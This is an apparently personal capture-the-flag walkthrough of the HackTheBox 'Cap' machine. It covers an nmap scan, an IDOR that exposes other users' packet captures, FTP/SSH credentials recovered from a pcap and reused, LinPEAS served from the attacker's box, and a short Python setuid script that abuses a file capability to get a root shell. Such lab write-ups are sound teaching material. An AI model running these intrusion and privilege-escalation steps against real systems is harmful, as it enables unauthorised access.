#  HackTheBox — Cap Walkthrough

## 🧭 Enumeration

We'll begin by scanning all ports using **Nmap**. You can also use `rustscan` if you prefer speed.

### 📡 Full TCP Nmap Scan

```bash
nmap -T4 -A -p- 10.10.10.245
```

```bash
Nmap scan report for 10.10.10.245
Host is up (0.26s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp   open  http       Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
8888/tcp open  tcpwrapped
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   256.02 ms 10.10.14.1
2   256.16 ms 10.10.10.245

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 793.62 seconds
```


FTP(21), SSH(22), HTTP(80) ports are open on this machine,
lets check out the HTTP service 


![Screenshot From 2025-06-11 16-11-08](https://github.com/user-attachments/assets/a8bb77a8-3004-4b03-a818-d1bec41fade2)

## IDOR
In the security snapshot section, we notice that the value of the `/data/id` increments everytime, this could mean we are able to view packet captures of other users. This is known as Insecure Direct Object Reference (IDOR), wherein a user can 
access data owned by another user

![Screenshot From 2025-06-11 16-14-56](https://github.com/user-attachments/assets/0d9bd8ad-458d-4bea-889c-0b84c9fb5401)


I tried `/data/0` and found multiple packets 

![Screenshot From 2025-06-11 16-18-32](https://github.com/user-attachments/assets/4a0044f5-8915-4369-9028-6ff4b29cc9b8)

We shall download the 0.pcap file and analyse it using wireshark

![Screenshot From 2025-06-11 16-21-11](https://github.com/user-attachments/assets/9837909f-a78b-42bc-bf0a-8cf888abd89e)

This part looks interesting, It seems to be a password to either FTP or SSH services
```bash
username: nathan
password: Buck3tH4TF0RM3!
```

I used the credentials for FTP and it worked!

![Screenshot From 2025-06-11 16-24-59](https://github.com/user-attachments/assets/098a17ec-46f3-4d1b-a4cf-35a0d680c966)

It worked for SSH as well

![Screenshot From 2025-06-11 16-28-11](https://github.com/user-attachments/assets/3dacc215-eddb-478f-a476-390b34a851fe)

now we have a shell in the system : D

![Screenshot From 2025-06-11 16-30-33](https://github.com/user-attachments/assets/e3cd4816-c596-4e83-9606-2b3144fe8a2b)

the user flag in user.txt is in plain sight


## 💂 Privelege Escalation

We shall use LinPeas.sh to escalate priveleges in this machine and gain root access, but LinPeas is not provided in the machine, hence I shall host it using a python http server on my Kali box and simply `cURL` it in the machine


![Screenshot From 2025-06-11 16-37-16](https://github.com/user-attachments/assets/d3306b3d-3b81-4c75-ae63-69f455da1bb6)

Now we can `curl` it to the machine !

![Screenshot From 2025-06-11 16-37-01](https://github.com/user-attachments/assets/dad6016b-0271-4f7a-914e-7ac92e0f7ad8)

we take a look at the "Files with capabilities" section of the linpeas output and find this

![Screenshot From 2025-06-11 16-42-35](https://github.com/user-attachments/assets/cb178f31-14c6-4403-a5da-6b821d0b0c44)

![Screenshot From 2025-06-11 16-46-07](https://github.com/user-attachments/assets/b4979a1d-99ae-4207-9d68-569c2fa4325b)

This lets us change UID to 0 i.e root

we run the python script with the following code:
``` bash
import os
os.setuid(0)
os.system("/bin/bash")
```
![Screenshot From 2025-06-11 16-49-26](https://github.com/user-attachments/assets/7c7e46ac-54e1-4284-a7c1-1fe61fe4a423)

Now that we've gained root access, we shall move to the root dircetory and find the root flag!

![Screenshot From 2025-06-11 16-52-12](https://github.com/user-attachments/assets/c6a123ef-92f5-4ea1-ae1d-2a4e3998e777)


Happy Hacking!!!
                                                              
